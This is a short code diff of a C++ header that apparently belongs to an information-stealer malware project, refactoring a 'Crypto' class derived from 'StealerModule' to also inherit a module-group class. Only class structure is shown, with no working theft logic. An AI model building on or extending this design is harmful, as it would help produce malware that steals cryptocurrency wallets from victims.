@@ -7,15 +7,12 @@
 
 
 #include "../../StealerModule.h"
-#include <thread>
+#include "../../StealerModuleGroup.h"
 
-class Crypto : public StealerModule {
+class Crypto : public StealerModule, StealerModuleGroup {
 public:
     Crypto();
     void execute(fs::path& root) override;
-
-private:
-    std::list<StealerModule*> modules;
 };
 
 
